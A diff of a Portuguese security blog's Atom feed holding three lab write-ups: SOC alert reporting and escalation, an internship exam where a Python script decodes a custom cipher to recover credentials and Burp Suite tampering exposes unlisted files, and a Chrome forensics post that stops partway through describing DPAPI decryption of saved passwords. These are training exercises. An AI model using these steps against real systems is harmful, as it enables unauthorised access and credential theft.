@@ -1,217 +1,1088 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2026-01-08T09:31:35-03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">CyberSec Blog - Kaio Barbosa</title><subtitle>Blog pessoal de cibersegurança.</subtitle><author><name>Kaio Barbosa</name><email>kaioedu388@gmail.com</email></author><entry><title type="html">TryHackMe - Soc Level 1</title><link href="http://localhost:4000/TryHackMe-Soc-Level-1/" rel="alternate" type="text/html" title="TryHackMe - Soc Level 1" /><published>2025-04-25T07:00:12-03:00</published><updated>2025-04-25T07:00:12-03:00</updated><id>http://localhost:4000/TryHackMe%20-%20Soc%20Level%201</id><content type="html" xml:base="http://localhost:4000/TryHackMe-Soc-Level-1/"><![CDATA[<h2 id="contexto">Contexto</h2>
+<p>Essa sala tem como objetivo preparar analistas SOC de nível 1 abordando cenários em que os analistas L1 enfrentam ataques reais que exigem resposta imediata e ações de remediação. Para isso, a sala introduz três conceitos fundamentais: relato de alertas (alert reporting), escalonamento (escalation) e comunicação (communication). Nela, vamos aprender a importância do relato e do escalonamento de alertas, como escrever comentários ou relatórios de casos de forma profissional, métodos eficazes de escalonamento e boas práticas de comunicação.</p>
+
+<h2 id="task-2">Task 2</h2>
+
+<p>“Na sala anterior, você aprendeu como classificar e fazer a triagem dos alertas. Mas talvez esteja curioso sobre o que acontece depois disso. Como a sua triagem ajuda a prevenir ameaças e impedir invasões? Esse é um novo tópico que será abordado em breve nesta sala, mas, por enquanto, vamos relembrar o caminho dos alertas.</p>
+
+<p>Primeiro, os analistas L1 recebem os alertas em plataformas como SIEM, EDR ou sistemas de gerenciamento de tickets. A maioria dos alertas é encerrada como falso positivo ou resolvida no próprio nível L1, mas os casos mais complexos e ameaçadores são encaminhados para o L2, que é responsável por remediar a maioria das violações. E para encaminhar os alertas adiante, é preciso aprender três novos termos: relato (reporting), escalonamento (escalation) e comunicação (communication).</p>
+
+<p>É como um funil: o L1 lida com 100 alertas, escalona 10 positivos reais (True Positives) para o L2, e apenas 1 deles acaba exigindo uma resposta forense e de investigação (DFIR) no final.
+<img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1743606354595.svg" alt="" /></p>
+
+<p><strong>Relato de Alertas (Alert Reporting)</strong></p>
+
+<p>Antes de encerrar ou encaminhar o alerta para o L2, você pode precisar reportá-lo. Dependendo dos padrões da equipe e da gravidade do alerta, em vez de apenas um comentário breve, pode ser necessário documentar sua investigação com detalhes, garantindo que todas as evidências relevantes estejam incluídas. Isso é especialmente importante para os True Positives (positivos reais), que exigem escalonamento.</p>
+
+<p><strong>Escalonamento de Alertas (Alert Escalation)</strong></p>
+
+<p>Se um alerta classificado como True Positive exigir ações adicionais ou uma investigação mais profunda, ele deve ser escalonado para um analista L2, seguindo os procedimentos acordados. É nesse momento que o seu relatório de alerta é útil, pois o L2 irá utilizá-lo para obter o contexto inicial e gastar menos tempo começando a análise do zero.</p>
+
+<p><strong>Comunicação (Communication)</strong></p>
+
+<p>Você também pode precisar se comunicar com outros departamentos durante ou após a análise. Por exemplo, perguntar à equipe de TI se confirmam a concessão de privilégios administrativos a determinados usuários ou entrar em contato com o RH para obter mais informações sobre um funcionário recém-contratado.”</p>
+
+<p><strong>Qual é o processo de encaminhar alertas suspeitos para um analista L2 revisar?</strong></p>
+
+<p>R:Alert [Redacted]</p>
+
+<p><strong>Qual é o processo de descrever formalmente os detalhes do alerta e as descobertas?</strong></p>
+
+<p>R: Alert [Redacted]</p>
+
+<h2 id="task-3">Task 3</h2>
+
+<p>Antes de seguirmos em frente, é essencial esclarecer por que alguém gostaria que analistas L1 escrevessem relatórios, além de apenas marcar os alertas como True ou False Positives, e por que esse tópico não pode ser subestimado. Fazer com que analistas L1 escrevam relatórios de alertas serve a vários propósitos importantes:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th><strong>Finalidade do Relatório de Alerta</strong></th>
+      <th>Explicação</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Fornecer contexto para escalonamento</td>
+      <td>- Um relatório bem escrito economiza muito tempo dos analistas L2<br />- Também os ajuda a entender rapidamente o que aconteceu</td>
+    </tr>
+    <tr>
+      <td>Salvar descobertas para registro</td>
+      <td>- Os logs brutos do SIEM são armazenados por 3 a 12 meses, mas os alertas são mantidos indefinidamente<br />- Por isso, é melhor manter todo o contexto dentro do alerta, por precaução</td>
+    </tr>
+    <tr>
+      <td>Melhorar as habilidades de investigação</td>
+      <td>- Se você não consegue explicar de forma simples, é porque não entende bem o suficiente<br />- Escrever relatórios é uma ótima forma de desenvolver as habilidades dos analistas L1 ao resumir os alertas</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Imagine-se como um analista L2, membro da equipe de DFIR ou profissional de TI que precisa entender o alerta. O que você gostaria de ver no relatório? Recomendamos seguir a abordagem dos Cinco Qs (Five Ws) e incluir pelo menos os seguintes itens no relatório:</p>
+
+<p>Quem (Who): Qual usuário fez login, executou o comando ou baixou o arquivo</p>
+
+<p>O quê (What): Qual ação exata ou sequência de eventos foi realizada</p>
+
+<p>Quando (When): Quando exatamente a atividade suspeita começou e terminou</p>
+
+<p>Onde (Where): Qual dispositivo, IP ou site esteve envolvido no alerta</p>
+
+<p>Por quê (Why): O mais importante dos Qs — o raciocínio por trás do seu veredito final</p>
+
+<p><strong>De acordo com o dashboard SOC, qual e-mail de usuário vazou o documento sensível?</strong></p>
+
+<p>O dashboard está disponível no link <strong>https://static-labs.tryhackme.cloud/apps/socl1-alertreporting/</strong>. Acessando-o, somos apresentados a um simulador de SIEM projetado pelo THM com alguns alertas.
+<img src="https://i.imgur.com/HNGwOlA.png" alt="" />
+Verificando o alerta “Sensitive Document Share to External”, podemos encontrar a resposta para a questão:
+<img src="https://i.imgur.com/x7R60RA.png" alt="" /></p>
+
+<p><strong>Analisando os novos alertas, quem é o ‘remetente’ do e-mail suspeito, provavelmente de phishing?</strong>
+Verificando o alerta “Email Marked as Phishing after Delivery”, podemos encontrar a resposta para a questão:
+<img src="https://i.imgur.com/IiLhL75.png" alt="" /></p>
+
+<p><strong>Abra o alerta de phishing, leia os detalhes e tente entender a atividade.
+Usando o modelo dos Cinco Porquês (Five Ws), qual foi a flag que você recebeu após escrever um bom relatório?</strong></p>
+
+<p>Verificando o alerta do e-mail de phishing, podemos analisar os 5 porquês, sendo eles:</p>
+
+<p><strong>1 - Quem?</strong></p>
+
+<p>-Microsoft Support: support@microsoft.com. Apesar de parecer legítimo, é um endereço falsificado (spoofed).</p>
+
+<p>-Eddie Huffman, IT Manager e.huffman@tryhackme.thm. Alvo com acesso privilegiado.</p>
+
+<p><strong>2 - O quê?</strong></p>
+
+<p>-Um e-mail de  <strong>phishing</strong>, contendo:</p>
+
+<ul>
+  <li>Linguagem alarmante (ex:  <em>“600% price increase”</em> , <em>“urgent notice”)</em></li>
+  <li>Um anexo chamado  <strong>REPORT.rar</strong> , potencialmente malicioso</li>
+  <li>Falha nas verificações <strong>SPF</strong> e <strong>DKIM</strong>.</li>
+</ul>
+
+<p><strong>3 - Quando?</strong></p>
+
+<p>-27 de março de 2025 às 19h25.</p>
+
+<p><strong>4 - Onde?</strong></p>
+
+<p>-O ataque ocorreu via  <strong>e-mail corporativo</strong>, direcionado para um gerente de TI, potencialmente expondo a rede interna.</p>
+
+<p><strong>5 - Por quê?</strong></p>
+
+<p>-Provavelmente para:</p>
+
+<ul>
+  <li>Induzir o usuário a abrir o anexo malicioso</li>
+  <li>Explorar sua posição na empresa para obter acesso à rede</li>
+  <li>Roubar credenciais, instalar malware ou ransomware</li>
+</ul>
+
+<p>Com essas informações, desenvolvi o seguinte relatório para o alerta:</p>
+
+<blockquote>
+  <p>Phishing identificado em 27/03/2025 às 19:25 - E-mail enviado de support@microsoft.com para Eddie Huffman (IT Manager), com tentativa de engenharia social explorando urgência relacionada a um suposto aumento no preço do Microsoft Teams. E-mail continha anexo malicioso em formato .rar. Cabeçalhos indicam falha nas validações de autenticação: SPF/Fail; DKIM/Fail. Indicativo de spoofing e potencial campanha de phishing com entrega de malware.</p>
+</blockquote>
+
+<p>Também preenchi o alerta da seguinte forma:</p>
+
+<p><img src="https://i.imgur.com/GJnODBc.png" alt="" /></p>
+
+<p>Dessa forma, foi possível conseguir a flag.</p>
+
+<h2 id="task-4">Task 4</h2>
+
+<p>Depois de chegar a um veredito e escrever seu relatório de alerta, você deve decidir se o alerta precisa ser escalonado para o L2. Novamente, a resposta pode variar de equipe para equipe, mas as seguintes recomendações geralmente se aplicam à maioria dos times SOC. Você deve escalar os alertas se:</p>
+
+<ol>
+  <li>O alerta for um indicativo de um grande ciberataque que exija investigação mais profunda ou DFIR</li>
+  <li>Ações de remediação, como remoção de malware, isolamento de host ou redefinição de senha forem necessárias</li>
+  <li>For necessária comunicação com clientes, parceiros, gestão ou órgãos legais</li>
+  <li>Você simplesmente não entende totalmente o alerta e precisa de ajuda de analistas mais experientes</li>
+</ol>
+
+<p><strong>Etapas de Escalonamento</strong></p>
+
+<p>Para escalar um alerta, na maioria dos casos, tudo o que você precisa fazer é reatribuir o alerta para o L2 de plantão e notificá-lo via chat corporativo ou pessoalmente. No entanto, em algumas equipes, pode ser necessário preencher uma solicitação formal de escalonamento com dezenas de campos obrigatórios.</p>
+
+<p>Independentemente do processo adotado, o L2 acabará recebendo o ticket, lendo o seu relatório e entrando em contato com você caso tenha dúvidas. Uma vez que tudo esteja claro, o analista L2 normalmente irá aprofundar a investigação do alerta, validar se ele é de fato um True Positive, comunicar-se com outros departamentos, se necessário, e, em casos graves, iniciar um processo formal de Resposta a Incidentes.</p>
+
+<p>Procedimento de Escalonamento no Painel SOC</p>
+
+<ol>
+  <li>Escreva um relatório do alerta e forneça seu veredito; mova o alerta para o status Em andamento (In Progress)</li>
+  <li>Atribua o alerta ao L2 de plantão. O L2 receberá uma notificação e começará a partir do seu relatório</li>
+</ol>
+
+<p><strong>Escalonando Ameaças para o L2</strong>
+<img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1743520297119.svg" alt="" /></p>
+
+<p><strong>Solicitando Suporte do L2</strong>
+<img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1743520519371.svg" alt="" /></p>
+
+<p><strong>Quem é o seu atual analista L2 no painel do SOC para quem você pode atribuir (escalonar) os alertas?</strong></p>
+
+<p>Verificando as assinaturas disponiveís no simulador do SIEM, é possível identificar quem é o L2.</p>
+
+<p><img src="https://i.imgur.com/Ky0E45b.png" alt="" /></p>
+
+<p><strong>Qual foi a flag que você recebeu após escalonar corretamente o alerta da tarefa anterior para o L2? Nota: Se você já escalonou corretamente o alerta anteriormente, basta editar o alerta e clicar em “Salvar” novamente.</strong></p>
+
+<p>Voltando novamente ao alerta de phishing, é possível conseguir a flag realizando a edição do alerta da seguinte forma:
+<img src="https://i.imgur.com/EafFwsw.png" alt="" /></p>
+
+<p><strong>Agora, investigue o segundo novo alerta na fila e forneça um comentário detalhado sobre o alerta. Em seguida, decida se é necessário escalonar esse alerta e siga o processo conforme indicado. Após concluir sua triagem, você deverá receber uma flag, que será a sua resposta!</strong></p>
+
+<p>Analisando o alerta “Spike of Domain Discovery Commands” é possível encontrar as informações que precisamos para desenvolver nosso relatório.</p>
+
+<p><strong>1 - Quem?</strong>
+-NT AUTHORITY\SYSTEM. A atividade está sendo executada com permissões de sistema, o que indica que o processo tem acesso elevado e pode ter controle total sobre o sistema.
+-Processos envolvidos:</p>
+
+<ol>
+  <li>cmd.exe</li>
+  <li>revshell.exe</li>
+</ol>
+
+<p><strong>2 - O quê?</strong>
+-Foi detectada uma sequência de comandos suspeitos (whoami, net user, Get-ADUser, etc.), frequentemente associada a descoberta de domínio Active Directory (AD), o que indica que a máquina pode estar sendo reconhecida por um atacante para mapear o ambiente AD. A atividade foi originada de um processo não autorizado (revshell.exe), indicando um possível acesso remoto indevido.</p>
+
+<p><strong>3 - Quando?</strong>
+-27 de março de 2025, às 19h56.</p>
+
+<p><strong>4 - Onde?</strong>
+-O alerta ocorreu no servidor DMZ-MSEXCHANGE-2013.
+-O sistema operacional é Windows Server 2012 R2, o que pode ser importante para avaliar vulnerabilidades conhecidas desse SO.</p>
+
+<p><strong>5 - Por quê?</strong>
+-O uso de comandos típicos de descoberta de AD (como net user, whoami, nltest) pode indicar que um invasor está tentando mapear a rede e encontrar informações sensíveis, como contas de administrador ou outros dados de acesso. O fato de o processo ter sido iniciado por um script revshell.exe sugere que pode haver controle remoto malicioso em andamento, possivelmente com a intenção de comprometer ainda mais a rede ou exfiltrar dados.</p>
+
+<p>Com essas informações, desenvolvi o seguinte relatório para o alerta:</p>
+
+<blockquote>
+  <p>No dia 27/03/2025, foi detectado no host DMZ-MSEXCHANGE-2013, um padrão de comandos  associados a atividades de recon em ambientes Active Directory. Entre os comandos executados estão: dir, hostname, whoami /priv, net group “Domain Admins” /domain e nltest /dclist:tryhackme.thm. Essa atividade foi executada sob o contexto do usuário NT AUTHORITY\SYSTEM, através do processo cmd.exe, iniciado pelo executável revshell.exe, cujo processo pai é w3wp.exe, indicando um possível comprometimento do servidor via shell reversa.</p>
+</blockquote>
+
+<p>Escalonei o alerta para L2, da seguinte forma:
+<img src="https://i.imgur.com/EBuQoji.png" alt="" /></p>
+
+<p>Dessa forma, conseguir a flag.</p>
+
+<p>Caso você discorde, ou queira adicionar algo a esse artigo, você pode me chamar no linkedin para que possamos conversar! https://www.linkedin.com/in/kaiobarbosa/ .</p>]]></content><author><name>Kaio Barbosa</name><email>kaioedu388@gmail.com</email></author><summary type="html"><![CDATA[Contexto Essa sala tem como objetivo preparar analistas SOC de nível 1 abordando cenários em que os analistas L1 enfrentam ataques reais que exigem resposta imediata e ações de remediação. Para isso, a sala introduz três conceitos fundamentais: relato de alertas (alert reporting), escalonamento (escalation) e comunicação (communication). Nela, vamos aprender a importância do relato e do escalonamento de alertas, como escrever comentários ou relatórios de casos de forma profissional, métodos eficazes de escalonamento e boas práticas de comunicação.]]></summary></entry><entry><title type="html">Prova de estágio Tempest 2</title><link href="http://localhost:4000/tempest/Tempest-Prova-de-Est%C3%A1gio-2/" rel="alternate" type="text/html" title="Prova de estágio Tempest 2" /><published>2025-01-13T01:00:12-03:00</published><updated>2025-01-13T01:00:12-03:00</updated><id>http://localhost:4000/tempest/Tempest%20-%20Prova%20de%20Est%C3%A1gio%202</id><content type="html" xml:base="http://localhost:4000/tempest/Tempest-Prova-de-Est%C3%A1gio-2/"><![CDATA[<h2 id="contexto">Contexto</h2>
+<p>A prova de estágio da Tempest ocorreu até o dia 08/01/2025 até 13/01/2025 e uma das etapas da prova, foi necessário ajudar uma empresa em que havia sido alvo de hackativitas.</p>
+
+<p>Foi fornecido o link do site da empresa. Ao acessá-lo, uma mensagem deixada pelos atacantes estava visível:
+<img src="https://i.imgur.com/n6jfK01.png" alt="" /></p>
+
+<p>Analisando o código-fonte do site, foi encontrada uma assinatura dos atacantes no arquivo js:
+<img src="https://i.imgur.com/Z7M8mW8.png" alt="" /></p>
+
+<p>Pesquisando essa assinatura no GitHub, identifiquei um usuário chamado “MrGhostBot” com um repositório chamado “Narada”:
+<img src="https://i.imgur.com/ikLcF15.png" alt="" /></p>
+
+<p>Dentro desse repositório, localizei um código Python que criptografava qualquer string fornecida pelo usuário:
+<img src="https://i.imgur.com/36Biisw.png" alt="" /></p>
+
+<p>Para que o código funcionasse, era necessário encontrar o valor da variável fixed_vector, que havia sido removida anteriormente. Mas, ao analisar o repositório, consegui localizar o valor dessa variável:
+<img src="https://i.imgur.com/UOmmP9c.png" alt="" /></p>
+
+<p>Realizando uma varredura de diretórios no servidor, encontrei as rotas /chat, /login e /admin:
+<img src="https://i.imgur.com/a1PpUwc.png" alt="" /></p>
+
+<p>Ao acessar /chat, descobri uma conversa entre o CTO e o Help Desk contendo um acesso cifrado:
+<img src="https://i.imgur.com/vMSVWv0.png" alt="" /></p>
+
+<p>Para decifrar a string fornecida, alterei o código do repositório. Após as modificações, utilizei o valor de fixed_vector obtido e decifrei a string:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">base64</span>
+
+<span class="k">def</span> <span class="nf">string_to_binary</span><span class="p">(</span><span class="n">input_string</span><span class="p">):</span>
+    <span class="k">return</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">format</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">),</span> <span class="s">'08b'</span><span class="p">)</span> <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">input_string</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">binary_to_string</span><span class="p">(</span><span class="n">binary_string</span><span class="p">):</span>
+    <span class="n">char_array</span> <span class="o">=</span> <span class="p">[</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">binary_string</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">8</span><span class="p">],</span> <span class="mi">2</span><span class="p">))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">binary_string</span><span class="p">),</span> <span class="mi">8</span><span class="p">)]</span>
+    <span class="k">return</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">char_array</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">invert_binary</span><span class="p">(</span><span class="n">binary_string</span><span class="p">):</span>
+    <span class="k">return</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="s">'1'</span> <span class="k">if</span> <span class="n">bit</span> <span class="o">==</span> <span class="s">'0'</span> <span class="k">else</span> <span class="s">'0'</span> <span class="k">for</span> <span class="n">bit</span> <span class="ow">in</span> <span class="n">binary_string</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">reverse_binary</span><span class="p">(</span><span class="n">binary_string</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">binary_string</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="k">def</span> <span class="nf">xor_with_fixed_vector</span><span class="p">(</span><span class="n">binary_string</span><span class="p">,</span> <span class="n">fixed_vector</span><span class="p">):</span>
+    <span class="n">fixed_vector</span> <span class="o">=</span> <span class="n">fixed_vector</span><span class="p">[:</span><span class="nb">len</span><span class="p">(</span><span class="n">binary_string</span><span class="p">)]</span>
+    <span class="k">return</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">^</span> <span class="nb">int</span><span class="p">(</span><span class="n">b</span><span class="p">))</span> <span class="k">for</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">binary_string</span><span class="p">,</span> <span class="n">fixed_vector</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">binary_to_base64</span><span class="p">(</span><span class="n">binary_string</span><span class="p">):</span>
+    <span class="n">byte_array</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">binary_string</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">8</span><span class="p">],</span> <span class="mi">2</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">binary_string</span><span class="p">),</span> <span class="mi">8</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">byte_array</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">base64_to_binary</span><span class="p">(</span><span class="n">base64_string</span><span class="p">):</span>
+    <span class="n">byte_array</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">base64_string</span><span class="p">)</span>
+    <span class="k">return</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">format</span><span class="p">(</span><span class="n">byte</span><span class="p">,</span> <span class="s">'08b'</span><span class="p">)</span> <span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="n">byte_array</span><span class="p">)</span>
 
 
-<feed xmlns="http://www.w3.org/2005/Atom">
-  <id>http://localhost:4000/</id>
-  <title>Projekt Yoshiro</title>
-  <subtitle>A minimal, responsive and feature-rich Jekyll theme for technical writing.</subtitle>
-  <updated>2026-01-05T10:15:09-03:00</updated>
-  <author>
-    <name>Yoshiro</name>
-    <uri>http://localhost:4000/</uri>
-  </author>
-  <link rel="self" type="application/atom+xml" href="http://localhost:4000/feed.xml"/>
-  <link rel="alternate" type="text/html" hreflang="pt"
-    href="http://localhost:4000/"/>
-  <generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator>
-  <rights> © 2026 Yoshiro </rights>
-  <icon>/assets/img/favicons/favicon.ico</icon>
-  <logo>/assets/img/favicons/favicon-96x96.png</logo>
+<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">encrypted_base64</span><span class="p">,</span> <span class="n">fixed_vector</span><span class="p">):</span>
+    <span class="n">binary_string</span> <span class="o">=</span> <span class="n">base64_to_binary</span><span class="p">(</span><span class="n">encrypted_base64</span><span class="p">)</span>
+    <span class="n">xored_binary</span> <span class="o">=</span> <span class="n">xor_with_fixed_vector</span><span class="p">(</span><span class="n">binary_string</span><span class="p">,</span> <span class="n">fixed_vector</span><span class="p">)</span>
+    <span class="n">reversed_binary</span> <span class="o">=</span> <span class="n">reverse_binary</span><span class="p">(</span><span class="n">xored_binary</span><span class="p">)</span>
+    <span class="n">inverted_binary</span> <span class="o">=</span> <span class="n">invert_binary</span><span class="p">(</span><span class="n">reversed_binary</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">binary_to_string</span><span class="p">(</span><span class="n">inverted_binary</span><span class="p">)</span>
 
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">input_string</span> <span class="o">=</span>  <span class="s">"Wfvb+dlz2RuZO3szeXMJm8NDW+Pz4w=="</span>
+    <span class="n">fixed_vector</span> <span class="o">=</span> <span class="s">"10101010101010101010101010101010"</span> <span class="o">*</span> <span class="mi">10</span>
 
-  
-  <entry>
-    <title>TryHackMe - Soc Level 1</title>
-    <link href="http://localhost:4000/posts/TryHackMe-Soc-Level-1/" rel="alternate" type="text/html" title="TryHackMe - Soc Level 1" />
-    <published>2025-04-25T07:00:12-03:00</published>
-  
-    <updated>2025-05-02T08:41:58-03:00</updated>
-  
-    <id>http://localhost:4000/posts/TryHackMe-Soc-Level-1/</id>
-    <content src="http://localhost:4000/posts/TryHackMe-Soc-Level-1/" />
-    <author>
-      <name>Yoshiro</name>
-    </author>
+    <span class="n">decrypted</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">input_string</span><span class="p">,</span> <span class="n">fixed_vector</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"Decrypted String:"</span><span class="p">,</span> <span class="n">decrypted</span><span class="p">)</span>
+</code></pre></div></div>
+<p><img src="https://i.imgur.com/aTgWSA1.png" alt="" /></p>
 
-  
-    
-  
+<p>Com as credenciais obtidas, consegui acessar o sistema em /login:
+<img src="https://i.imgur.com/aKmiG9Z.png" alt="" /></p>
 
-  
-    <summary>
-      
+<p>O sistema não era todo interativo, permitindo apenas a visualização dos endereços de carteira e o download de arquivos com as despesas. Como já havíamos identificado o endereço da carteira envolvida em uma transferência realizada em 15/06/2024, o próximo passo era descobrir quem havia feito a transferência de ID TXN0056.</p>
 
+<p>Ao realizar o download das despesas, o sistema forneceu apenas o arquivo exp_1.txt, que apresentava os 20 primeiros IDs:
+<img src="https://i.imgur.com/JKGzlnD.png" alt="" />
+Suspeitei que existiam outros arquivos numerados sequencialmente. Usando o Burp Suite, modifiquei a solicitação para obter o arquivo exp_3.txt:
+<img src="https://i.imgur.com/c4PCzqB.png" alt="" />
+<img src="https://i.imgur.com/BTBE9Uo.png" alt="" />
+Com sucesso, recebi o arquivo completo e identifiquei quem realizou a transferência:
+<img src="https://i.imgur.com/en36ggd.png" alt="" /></p>]]></content><author><name>Kaio Barbosa</name><email>kaioedu388@gmail.com</email></author><category term="Tempest" /><category term="tempest" /><summary type="html"><![CDATA[Contexto A prova de estágio da Tempest ocorreu até o dia 08/01/2025 até 13/01/2025 e uma das etapas da prova, foi necessário ajudar uma empresa em que havia sido alvo de hackativitas.]]></summary></entry><entry><title type="html">THM - Chrome</title><link href="http://localhost:4000/thm/hard/THM-Chrome/" rel="alternate" type="text/html" title="THM - Chrome" /><published>2024-12-09T13:00:12-03:00</published><updated>2024-12-09T13:00:12-03:00</updated><id>http://localhost:4000/thm/hard/THM-Chrome</id><content type="html" xml:base="http://localhost:4000/thm/hard/THM-Chrome/"><![CDATA[<h1 id="contexto">Contexto</h1>
+<p>Um agente malicioso entrou na rede e extraiu algo, mas a pergunta é: o que exatamente?</p>
 
+<h2 id="analisando-os-pacotes">Analisando os pacotes.</h2>
 
+<p>A princípio, foi disponibilizado um pacote de rede para que seja realizada a análise do mesmo. Utilizando o Wireshark, podemos perceber que, em um primeiro momento, a maioria do tráfego ocorre através do protocolo SMB. O SMB é um protocolo de comunicação que permite o compartilhamento de arquivos, ou seja, ocorreu algum tráfego de arquivos na rede.</p>
 
+<p><img src="https://i.imgur.com/Yv1gxX3.png" alt="" /></p>
 
-      Contexto
+<p>Utilizando a opção de exportar objetos através do protocolo SMB, é possível identificar que houve a comunicação de dois arquivos interessantes: o transfer.exe e o encrypted_files.
+<img src="https://i.imgur.com/oHMhATI.png" alt="" /></p>
 
-Essa sala tem como objetivo preparar analistas SOC de nível 1 abordando cenários em que os analistas L1 enfrentam ataques reais que exigem resposta imediata e ações de remediação. Para isso, a sala introduz três conceitos fundamentais: relato de alertas (alert reporting), escalonamento (escalation) e comunicação (communication). Nela, vamos aprender a importância do relato e do escalo...
-    </summary>
-  
+<h2 id="engenharia-reversa">Engenharia reversa.</h2>
 
-  </entry>
+<p>Analisando o arquivo transfer.exe, foi possível identificar que ele foi compilado utilizando .NET Assembly. Após uma rápida pesquisa, encontrei a ferramenta <a href="https://github.com/icsharpcode/ILSpy">ILSpy</a>, que auxiliará na descompilação do .exe
+<img src="https://i.imgur.com/x3aQ9PF.png" alt="" /></p>
 
-  
-  <entry>
-    <title>Prova de estágio Tempest 2</title>
-    <link href="http://localhost:4000/posts/Tempest-Prova-de-Est%C3%A1gio-2/" rel="alternate" type="text/html" title="Prova de estágio Tempest 2" />
-    <published>2025-01-13T01:00:12-03:00</published>
-  
-    <updated>2025-01-13T01:00:12-03:00</updated>
-  
-    <id>http://localhost:4000/posts/Tempest-Prova-de-Est%C3%A1gio-2/</id>
-    <content src="http://localhost:4000/posts/Tempest-Prova-de-Est%C3%A1gio-2/" />
-    <author>
-      <name>Yoshiro</name>
-    </author>
+<p>Com a ferramenta, foi possível acessar o código-fonte e, com isso, detectar que são declaradas duas matrizes de bytes e, em seguida, são utilizadas como chave e IV para a criptografia AES, utilizando o UTF-8. O atacante utiliza esse método para criptografar o arquivo files.zip e, depois, o transforma no arquivo encrypted_files, que foi extraído anteriormente utilizando o Wireshark.
+<img src="https://i.imgur.com/ayYg9KU.png" alt="" /></p>
 
-  
-    
-    <category term="Tempest" />
-    
-  
+<p>Com essas informações, consegui descriptografar o arquivo encrypted_files utilizando o CyberChef, com os dados encontrados durante a engenharia reversa.
+<img src="https://i.imgur.com/IdqNVM1.png" alt="" /></p>
 
-  
-    <summary>
-      
+<h2 id="analisando-o-zip-descompactado">Analisando o .zip descompactado.</h2>
 
+<p>Descompactando o arquivo files.zip, foi possível perceber que o agente malicioso extraiu da rede arquivos relacionados do Google Chrome.</p>
 
+<p>O Google Chrome utiliza a DPAPI em conjunto com o AES-256 para criptografar os dados. Nesse contexto, as senhas criptografadas podem ser encontradas no arquivo Login Data, localizado em /AppData/Local/Google/Chrome/User Data/Default. A criptografia das senhas é realizada com uma chave armazenada no arquivo Local State, que está localizado em AppData/Local/Google/Chrome/User Data.</p>
 
+<p>Ao consultar a documentação da Microsoft sobre a DPAPI, é possível verificar que a chave armazenada no arquivo Local State, usada para a descriptografação, é a master key do usuário, que, por sua vez, é criptografada com a senha do próprio usuário. Vale destacar que a master key, responsável por criptografar os dados protegidos pela DPAPI, pode ser localizada no diretório AppData/Roaming/Microsoft/Protect/SID</p>
 
+<p>Dessa forma, vai se construindo um caminho em que, para que seja possível visualizar os logins que estão armazenados, é necessário:<br />
+1) Descobrir a senha local do usuário.
+2) Usar a senha local para descriptografar a master key.
+3) Utilizar a master key para descriptografar os logins armazenados.</p>
 
-      Contexto
